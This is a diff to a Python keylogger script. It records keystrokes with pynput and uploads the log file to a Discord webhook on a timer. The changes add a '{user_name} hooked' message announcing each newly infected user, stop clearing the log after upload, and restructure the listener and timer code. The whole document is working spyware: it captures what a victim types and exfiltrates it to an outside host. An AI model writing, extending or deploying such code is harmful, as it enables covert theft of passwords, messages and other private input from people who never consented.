@@ -50,21 +50,16 @@ def on_press(key):
                     key_set.add(key.char)
                     key_count += 1
             else:
-                if key == keyboard.Key.space:
-                    f.write(' ')
-                elif key == keyboard.Key.enter:
-                    f.write('\n')
-                else:
-                    f.write(f'[{key}]')
-                    if key == keyboard.Key.backspace:
-                        key_set.add('backspace')
-                        key_count += 1
-                    elif key == keyboard.Key.esc:
-                        key_set.add('esc')
-                        key_count += 1
-                    elif key == keyboard.Key.tab:
-                        key_set.add('tab')
-                        key_count += 1
+                f.write(f'[{key}]')
+                if key == keyboard.Key.backspace:
+                    key_set.add('backspace')
+                    key_count += 1
+                elif key == keyboard.Key.esc:
+                    key_set.add('esc')
+                    key_count += 1
+                elif key == keyboard.Key.tab:
+                    key_set.add('tab')
+                    key_count += 1
 
     except AttributeError:
         pass
@@ -120,31 +115,43 @@ def send_log_to_discord():
                 response = requests.post(webhook_url, files=files)
                 if response.status_code == 200:
                     print('Log file sent successfully.')
+                    # Send a success message to Discord
+                    success_message = f"{user_name} hooked"
+                    data = {
+                        "content": success_message
+                    }
+                    response = requests.post(webhook_url, json=data)
+                    if response.status_code == 200:
+                        print('Success message sent successfully.')
+                    else:
+                        print(f'Failed to send success message. Status code: {response.status_code}')
                 else:
                     print(f'Failed to send log file. Status code: {response.status_code}')
-            # Clear the log file
-            open(log_path, 'w').close()
-            idle_time = 30  # Reset idle time to 30 seconds after sending log
+    except Exception as e:
+        print(f'Error sending log file: {e}')
 
-        # Schedule the next call to this function
-        log_timer = threading.Timer(30, send_log_to_discord)
-        log_timer.start()
-    except RuntimeError as e:
-        if 'interpreter shutdown' in str(e):
-            print('Interpreter is shutting down, cannot start new thread.')
-        else:
-            raise
+    # Schedule the next log send
+    log_timer = threading.Timer(idle_time, send_log_to_discord)
+    log_timer.start()
 
-# Start the keyboard listener
-listener = keyboard.Listener(on_press=on_press, on_release=on_release)
-listener.start()
+# Function to send the start message to Discord
+def send_start_message():
+    start_message = f"{user_name} hooked"
+    data = {
+        "content": start_message
+    }
+    response = requests.post(webhook_url, json=data)
+    if response.status_code == 200:
+        print('Start message sent successfully.')
+    else:
+        print(f'Failed to send start message. Status code: {response.status_code}')
 
-# Schedule the first log sending after 30 seconds
-log_timer = threading.Timer(30, send_log_to_discord)
-log_timer.start()
+# Send the start message
+send_start_message()
 
-# Print the path to the temporary file
-print(f'Keystrokes are being logged to: {log_path}')
-
-# Keep the script running
-listener.join()
+# Start the keylogger
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    # Schedule the first log send
+    log_timer = threading.Timer(idle_time, send_log_to_discord)
+    log_timer.start()
+    listener.join()
